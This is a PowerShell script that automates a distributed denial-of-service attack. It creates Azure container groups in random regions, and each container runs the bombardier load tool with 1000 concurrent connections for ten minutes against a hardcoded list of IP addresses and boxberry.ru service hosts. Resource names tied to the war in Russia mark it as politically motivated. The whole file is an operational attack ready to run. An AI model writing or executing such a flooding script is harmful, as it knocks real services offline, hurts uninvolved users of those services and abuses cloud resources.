$urls = @(
'https://185.165.123.58',
'https://37.18.29.167',
'https://178.154.196.210',
'https://130.193.36.55',
'https://185.165.123.228',
'https://188.130.235.84',
'https://lk.boxberry.ru',
'https://185.93.111.122',
'https://service.boxberry.ru',
'https://188.130.235.210',
'https://188.130.235.206',
'https://188.130.235.244',
'https://sd.boxberry.ru'
)

$id = 1

ForEach ($url in $urls)
{
    $resourceGroup = "rg-rus-war-23-" + $id
    $id++

    az group create --location westus --name $resourceGroup
    
    for ($i = 1; $i -lt 11; $i++)
    {
        $location = "australiaeast",  "australiasoutheast",  "brazilsouth",  "canadacentral",  "canadaeast",  "centralindia",  "centralus",  
         "eastasia",  "eastus",  "eastus2",  "francecentral",  "germanywestcentral",  "japaneast",  "japanwest", "koreacentral", 
         "northcentralus",  "northeurope",  "norwayeast",  "southafricanorth",  "southcentralus",  "southeastasia",  "southindia",  
         "switzerlandnorth",  "switzerlandwest",  "uaenorth",  "uksouth",  "ukwest",  "westcentralus",  "westeurope",  "westus",  "westus2", 
         "westus3" | Get-Random

        $name = "ruswar" + $i
        echo "ResouceGroup: ${resourceGroup} Container: ${name} location: ${location} url: ${url}";

        az container create --resource-group $resourceGroup --name $name --image alpine/bombardier:latest --restart-policy OnFailure --command-line "/gopath/bin/bombardier -c 1000 -d 600s -l ${url}" --location $location
    }

    echo "Waiting 900 sec for all containers to finish";

    Start-Sleep -Seconds 900

    echo "Deleting resource group ${resourceGroup}";
    az group delete --resource-group $resourceGroup --yes
}

